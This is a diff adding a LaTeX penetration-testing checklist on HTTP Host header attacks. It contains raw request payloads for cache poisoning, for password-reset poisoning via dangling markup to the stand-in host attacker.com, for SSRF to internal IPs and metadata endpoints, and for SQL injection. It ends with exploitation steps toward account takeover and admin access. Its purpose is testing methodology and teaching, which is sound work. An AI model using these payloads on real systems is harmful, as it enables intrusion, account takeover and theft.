@@ -1,0 +1,752 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{geometry}
+\usepackage{titlesec}
+\usepackage{fancyhdr}
+\usepackage{enumitem}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{tcolorbox}
+\usepackage{parskip}
+\usepackage{verbatim}
+
+% Page Setup
+\geometry{a4paper, margin=1in}
+\setlength{\parskip}{1em}
+\setlength{\parindent}{0pt}
+
+% Color Definitions
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{note}{rgb}{0.9,0.95,1}
+\definecolor{warning}{rgb}{1,0.95,0.9}
+\definecolor{danger}{rgb}{1,0.9,0.9}
+\definecolor{success}{rgb}{0.9,1,0.9}
+
+% Code Listing Settings
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{codepurple}\bfseries,
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codegreen},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+
+% Custom Commands
+\newtcolorbox{notebox}{colback=note,colframe=blue!50!black,title=\textbf{Note}}
+\newtcolorbox{warningbox}{colback=warning,colframe=orange!50!black,title=\textbf{Warning}}
+\newtcolorbox{tipbox}{colback=success,colframe=green!50!black,title=\textbf{Tip}}
+\newtcolorbox{vulnerablebox}{colback=danger,colframe=red!50!black,title=\textbf{Vulnerable Example}}
+\newtcolorbox{checklistbox}{colback=success,colframe=green!50!black,title=\textbf{Checklist Item}}
+
+\newcommand{\note}[1]{\begin{notebox}#1\end{notebox}}
+\newcommand{\warning}[1]{\begin{warningbox}#1\end{warningbox}}
+\newcommand{\tip}[1]{\begin{tipbox}#1\end{tipbox}}
+\newcommand{\vulnerable}[1]{\begin{vulnerablebox}#1\end{vulnerablebox}}
+\newcommand{\checkitem}[1]{\begin{checklistbox}\textbf{✓} #1\end{checklistbox}}
+
+% Title Formatting
+\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
+\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}
+\titleformat{\subsubsection}{\small\bfseries}{\thesubsubsection}{1em}{}
+
+% Document Information
+\title{
+    \vspace{2cm}
+    \Huge\textbf{HTTP Host Header Attacks} \\
+    \vspace{0.5cm}
+    \Large Testing Checklist \& Methodology
+    \vspace{1cm}
+}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+
+\section{Pre-Testing Phase}
+
+\subsection{Initial Setup}
+\begin{checklistbox}
+ Configure Burp Suite to intercept traffic
+\end{checklistbox}
+\begin{checklistbox}
+ Ensure Burp maintains separation between Host header and target IP
+\end{checklistbox}
+\begin{checklistbox}
+ Identify all application endpoints
+\end{checklistbox}
+\begin{checklistbox}
+ Note any caching headers (Age, Cache-Control, X-Cache)
+\end{checklistbox}
+
+\subsection{Information Gathering}
+\begin{checklistbox}
+ Identify all domains and subdomains
+\end{checklistbox}
+\begin{checklistbox}
+ Check for load balancers and CDN usage
+\end{checklistbox}
+\begin{checklistbox}
+ Review application architecture (if known)
+\end{checklistbox}
+\begin{checklistbox}
+ Identify password reset functionality
+\end{checklistbox}
+\begin{checklistbox}
+ Identify admin panels and restricted areas
+\end{checklistbox}
+
+% ============================================================
+% SECTION 3: BASIC HOST HEADER TESTS
+% ============================================================
+\section{Basic Host Header Tests}
+
+\subsection{Arbitrary Host Header Testing}
+\begin{lstlisting}[caption=Basic Test Suite]
+# Test 1: Arbitrary domain
+GET / HTTP/1.1
+Host: arbitrary.com
+
+# Test 2: Different case
+GET / HTTP/1.1
+Host: VULNERABLE.COM
+
+# Test 3: Localhost
+GET / HTTP/1.1
+Host: localhost
+
+# Test 4: IP address
+GET / HTTP/1.1
+Host: 127.0.0.1
+
+# Test 5: Invalid characters
+GET / HTTP/1.1
+Host: vulnerable.com<script>alert(1)</script>
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Send request with arbitrary domain
+\end{checklistbox}
+\begin{checklistbox}
+ Observe response status (200, 400, 403, 404)
+\end{checklistbox}
+\begin{checklistbox}
+ Check if domain is reflected in response
+\end{checklistbox}
+\begin{checklistbox}
+ Test with case variations
+\end{checklistbox}
+\begin{checklistbox}
+ Test with localhost and IP addresses
+\end{checklistbox}
+\begin{checklistbox}
+ Test with special characters
+\end{checklistbox}
+
+% ============================================================
+% SECTION 4: VALIDATION BYPASS TESTS
+% ============================================================
+\section{Validation Bypass Tests}
+
+\subsection{Port Manipulation}
+\begin{lstlisting}[caption=Port Injection Tests]
+# Numeric port
+GET / HTTP/1.1
+Host: vulnerable.com:9999
+
+# Non-numeric port
+GET / HTTP/1.1
+Host: vulnerable.com:malicious
+
+# Port with injection
+GET / HTTP/1.1
+Host: vulnerable.com:'<a href="//attacker.com/?
+\end{lstlisting}
+
+\subsection{Subdomain Tricks}
+\begin{lstlisting}[caption=Subdomain Tests]
+# Whitelist bypass
+GET / HTTP/1.1
+Host: notvulnerable-website.com
+
+# Compromised subdomain
+GET / HTTP/1.1
+Host: hacked-subdomain.vulnerable.com
+
+# DNS suffix matching
+GET / HTTP/1.1
+Host: evil.vulnerable-website.com
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test numeric port injection
+\end{checklistbox}
+\begin{checklistbox}
+ Test non-numeric port injection
+\end{checklistbox}
+\begin{checklistbox}
+ Test subdomain whitelist bypass
+\end{checklistbox}
+\begin{checklistbox}
+ Test DNS suffix matching
+\end{checklistbox}
+\begin{checklistbox}
+ Check if port is reflected in response
+\end{checklistbox}
+
+% ============================================================
+% SECTION 5: MULTIPLE HEADER TESTS
+% ============================================================
+\section{Multiple Host Header Tests}
+
+\subsection{Testing Methods}
+\begin{lstlisting}[caption=Multiple Header Tests]
+# Two different hosts
+GET / HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+# Case manipulation
+GET / HTTP/1.1
+Host: vulnerable.com
+HoSt: attacker.com
+
+# Duplicate headers
+GET / HTTP/1.1
+Host: vulnerable.com
+Host: vulnerable.com
+
+# Three or more
+GET / HTTP/1.1
+Host: first.com
+Host: second.com
+Host: third.com
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test with two different Host headers
+\end{checklistbox}
+\begin{checklistbox}
+ Test with case-manipulated headers
+\end{checklistbox}
+\begin{checklistbox}
+ Test with duplicate headers
+\end{checklistbox}
+\begin{checklistbox}
+ Observe which header takes precedence
+\end{checklistbox}
+\begin{checklistbox}
+ Check for differences in validation vs routing
+\end{checklistbox}
+
+% ============================================================
+% SECTION 6: HOST OVERRIDE HEADER TESTS
+% ============================================================
+\section{Host Override Header Tests}
+
+\subsection{Override Headers to Test}
+\begin{longtable}{|p{4cm}|p{6cm}|p{4cm}|}
+    \hline
+    \textbf{Header} & \textbf{Example} & \textbf{Status} \\
+    \hline
+    X-Forwarded-Host & X-Forwarded-Host: attacker.com & Test \\
+    \hline
+    X-Host & X-Host: attacker.com & Test \\
+    \hline
+    X-Forwarded-Server & X-Forwarded-Server: attacker.com & Test \\
+    \hline
+    X-HTTP-Host-Override & X-HTTP-Host-Override: attacker.com & Test \\
+    \hline
+    Forwarded & Forwarded: host=attacker.com & Test \\
+    \hline
+\end{longtable}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test X-Forwarded-Host
+\end{checklistbox}
+\begin{checklistbox}
+ Test X-Host
+\end{checklistbox}
+\begin{checklistbox}
+ Test X-Forwarded-Server
+\end{checklistbox}
+\begin{checklistbox}
+ Test X-HTTP-Host-Override
+\end{checklistbox}
+\begin{checklistbox}
+ Test Forwarded header
+\end{checklistbox}
+\begin{checklistbox}
+ Check if any header overrides Host
+\end{checklistbox}
+
+% ============================================================
+% SECTION 7: AMBIGUOUS REQUEST TESTS
+% ============================================================
+\section{Ambiguous Request Tests}
+
+\subsection{Testing Techniques}
+\begin{lstlisting}[caption=Ambiguous Request Tests]
+# Absolute URL method
+GET https://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+
+# Line wrapping (indented header)
+GET / HTTP/1.1
+    Host: attacker.com
+Host: vulnerable.com
+
+# Protocol variations
+GET http://vulnerable.com/ HTTP/1.1
+Host: attacker.com
+
+# Malformed request line
+GET @private-intranet/example HTTP/1.1
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test absolute URL method
+\end{checklistbox}
+\begin{checklistbox}
+ Test line wrapping with indented headers
+\end{checklistbox}
+\begin{checklistbox}
+ Test different protocols (http:// vs https://)
+\end{checklistbox}
+\begin{checklistbox}
+ Test malformed request line (@ symbol)
+\end{checklistbox}
+\begin{checklistbox}
+ Observe differences between front-end and back-end processing
+\end{checklistbox}
+
+% ============================================================
+% SECTION 8: CACHE POISONING TESTS
+% ============================================================
+\section{Cache Poisoning Tests}
+
+\subsection{Testing Procedure}
+\begin{lstlisting}[caption=Cache Poisoning Test Sequence]
+# Step 1: Establish baseline
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+
+# Step 2: Attempt poisoning
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+Host: attacker.com
+
+# Step 3: Verify poisoning
+GET /?cb=123 HTTP/1.1
+Host: vulnerable.com
+
+# Step 4: Check cache headers
+# Look for: X-Cache, Age, Cache-Control
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Identify cacheable endpoints
+\end{checklistbox}
+\begin{checklistbox}
+ Note cache headers (Age, Cache-Control)
+\end{checklistbox}
+\begin{checklistbox}
+ Use unique cache buster for each test
+\end{checklistbox}
+\begin{checklistbox}
+ Check if Host header reflected in cached response
+\end{checklistbox}
+\begin{checklistbox}
+ Verify cache hit with same buster
+\end{checklistbox}
+\begin{checklistbox}
+ Test with ambiguous requests for cache poisoning
+\end{checklistbox}
+
+% ============================================================
+% SECTION 9: PASSWORD RESET TESTS
+% ============================================================
+\section{Password Reset Tests}
+
+\subsection{Testing Procedure}
+\begin{lstlisting}[caption=Password Reset Test Sequence]
+# Step 1: Submit password reset
+POST /forgot-password HTTP/1.1
+Host: vulnerable.com
+username=test@email.com
+
+# Step 2: Attempt poisoning
+POST /forgot-password HTTP/1.1
+Host: vulnerable.com:'<a href="//attacker.com/?
+username=test@email.com
+
+# Step 3: Check email content
+# Look for: Links using injected host
+# Raw HTML vs rendered view
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Identify password reset functionality
+\end{checklistbox}
+\begin{checklistbox}
+ Check email generation and sending
+\end{checklistbox}
+\begin{checklistbox}
+ Analyze email content (raw HTML)
+\end{checklistbox}
+\begin{checklistbox}
+ Test Host header injection in reset link
+\end{checklistbox}
+\begin{checklistbox}
+ Test dangling markup injection
+\end{checklistbox}
+\begin{checklistbox}
+ Check if sanitization (DOMPurify) can be bypassed
+\end{checklistbox}
+\begin{checklistbox}
+ Verify token exfiltration via logs
+\end{checklistbox}
+
+% ============================================================
+% SECTION 10: SSRF TESTS
+% ============================================================
+\section{SSRF Tests}
+
+\subsection{Testing Procedure}
+\begin{lstlisting}[caption=SSRF Test Sequence]
+# Step 1: Collaborator detection
+GET https://vulnerable.com/ HTTP/1.1
+Host: BURP-COLLABORATOR.net
+
+# Step 2: Internal IP scanning
+GET https://vulnerable.com/ HTTP/1.1
+Host: 192.168.0.1
+Host: 10.0.0.1
+Host: 172.16.0.1
+
+# Step 3: Access internal services
+GET https://vulnerable.com/ HTTP/1.1
+Host: 192.168.0.1:6379   # Redis
+Host: 192.168.0.1:5432   # PostgreSQL
+Host: 192.168.0.1:3306   # MySQL
+\end{lstlisting}
+
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test with Burp Collaborator
+\end{checklistbox}
+\begin{checklistbox}
+ Scan internal IP ranges (192.168.x.x, 10.x.x.x)
+\end{checklistbox}
+\begin{checklistbox}
+ Test for admin panels on internal IPs
+\end{checklistbox}
+\begin{checklistbox}
+ Test internal service ports
+\end{checklistbox}
+\begin{checklistbox}
+ Test cloud metadata endpoints (169.254.169.254)
+\end{checklistbox}
+\begin{checklistbox}
+ Check for SSRF via absolute URL
+\end{checklistbox}
+\begin{checklistbox}
+ Check for SSRF via malformed request line
+\end{checklistbox}
+
+% ============================================================
+% SECTION 11: CONNECTION STATE TESTS
+% ============================================================
+\section{Connection State Tests}
+
+\subsection{Testing Procedure}
+\begin{lstlisting}[caption=Connection State Test Sequence]
+# Tab 1: Validation request
+GET / HTTP/1.1
+Host: vulnerable.com
+Connection: keep-alive
+
+# Tab 2: Exploitation request (same connection)
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Set Connection: keep-alive
+\end{checklistbox}
+\begin{checklistbox}
+ Send valid request first (establishes connection)
+\end{checklistbox}
+\begin{checklistbox}
+ Send malicious request on same connection
+\end{checklistbox}
+\begin{checklistbox}
+ Check if validation is bypassed
+\end{checklistbox}
+\begin{checklistbox}
+ Use "Send group in sequence" in Burp
+\end{checklistbox}
+
+% ============================================================
+% SECTION 12: VIRTUAL HOST BRUTE-FORCING
+% ============================================================
+\section{Virtual Host Brute-Forcing}
+
+\subsection{Common Subdomains Wordlist}
+\begin{lstlisting}[caption=Wordlist for Brute-Forcing]
+admin
+administrator
+management
+control
+intranet
+internal
+corporate
+staff
+employee
+dev
+development
+staging
+test
+qa
+uat
+dashboard
+portal
+panel
+console
+backend
+api
+api-gateway
+services
+microservices
+cdn
+assets
+static
+media
+files
+mail
+email
+smtp
+webmail
+exchange
+jenkins
+gitlab
+github
+bitbucket
+jira
+monitoring
+grafana
+prometheus
+kibana
+database
+db
+mysql
+postgres
+redis
+vpn
+vpn-gateway
+remote
+remote-access
+cloud
+cloud-admin
+aws
+azure
+gcp
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Use Burp Intruder for brute-forcing
+\end{checklistbox}
+\begin{checklistbox}
+ Test common subdomains
+\end{checklistbox}
+\begin{checklistbox}
+ Compare response status codes
+\end{checklistbox}
+\begin{checklistbox}
+ Check for different applications served
+\end{checklistbox}
+\begin{checklistbox}
+ Look for internal/private networks
+\end{checklistbox}
+
+% ============================================================
+% SECTION 13: SQL INJECTION TESTS
+% ============================================================
+\section{SQL Injection Tests}
+
+\subsection{Testing Procedure}
+\begin{lstlisting}[caption=SQL Injection Tests]
+# Basic injection
+Host: vulnerable.com' OR '1'='1
+
+# Blind injection
+Host: vulnerable.com' AND SLEEP(5)--
+
+# Error-based
+Host: vulnerable.com' AND 1=CONVERT(int, @@version)--
+
+# Union-based
+Host: vulnerable.com' UNION SELECT username,password FROM users--
+\end{lstlisting}
+
+\subsection{Checklist}
+\begin{checklistbox}
+ Test basic SQL injection
+\end{checklistbox}
+\begin{checklistbox}
+ Test blind SQL injection
+\end{checklistbox}
+\begin{checklistbox}
+ Observe error messages
+\end{checklistbox}
+\begin{checklistbox}
+ Test time-based injection
+\end{checklistbox}
+\begin{checklistbox}
+ Check for database errors in response
+\end{checklistbox}
+
+% ============================================================
+% SECTION 14: EXPLOITATION CHECKLIST
+% ============================================================
+\section{Exploitation Checklist}
+
+\subsection{Cache Poisoning Exploitation}
+\begin{checklistbox}
+ Identify reflected Host header
+\end{checklistbox}
+\begin{checklistbox}
+ Use cache buster to isolate
+\end{checklistbox}
+\begin{checklistbox}
+ Poison with malicious content
+\end{checklistbox}
+\begin{checklistbox}
+ Verify poisoning with same buster
+\end{checklistbox}
+\begin{checklistbox}
+ Remove buster for mass poisoning
+\end{checklistbox}
+
+\subsection{Password Reset Exploitation}
+\begin{checklistbox}
+ Identify password reset functionality
+\end{checklistbox}
+\begin{checklistbox}
+ Inject malicious Host header
+\end{checklistbox}
+\begin{checklistbox}
+ Check raw email content
+\end{checklistbox}
+\begin{checklistbox}
+ Steal reset token/password
+\end{checklistbox}
+\begin{checklistbox}
+ Perform account takeover
+\end{checklistbox}
+
+\subsection{SSRF Exploitation}
+\begin{checklistbox}
+ Confirm SSRF via Collaborator
+\end{checklistbox}
+\begin{checklistbox}
+ Scan internal IP ranges
+\end{checklistbox}
+\begin{checklistbox}
+ Access internal services
+\end{checklistbox}
+\begin{checklistbox}
+ Access admin panels
+\end{checklistbox}
+\begin{checklistbox}
+ Perform admin actions
+\end{checklistbox}
+
+
+
+% ============================================================
+% SECTION 16: SUMMARY CHECKLIST
+% ============================================================
+\section{Master Summary Checklist}
+
+\begin{longtable}{|p{2cm}|p{8cm}|p{2cm}|}
+    \hline
+    \textbf{Phase} & \textbf{Action} & \textbf{Status} \\
+    \hline
+    1 & Configure Burp Suite & \\
+    \hline
+    2 & Identify application endpoints & \\
+    \hline
+    3 & Test arbitrary Host header & \\
+    \hline
+    4 & Test validation bypasses & \\
+    \hline
+    5 & Test multiple headers & \\
+    \hline
+    6 & Test override headers & \\
+    \hline
+    7 & Test ambiguous requests & \\
+    \hline
+    8 & Test cache poisoning & \\
+    \hline
+    9 & Test password reset & \\
+    \hline
+    10 & Test SSRF & \\
+    \hline
+    11 & Test connection state & \\
+    \hline
+    12 & Brute-force virtual hosts & \\
+    \hline
+    13 & Test SQL injection & \\
+    \hline
+    14 & Document findings & \\
+    \hline
+    15 & Report vulnerabilities & \\
+    \hline
+\end{longtable}
+
+% ============================================================
+% SECTION 17: REPORTING TEMPLATE
+% ============================================================
+
+\end{document}
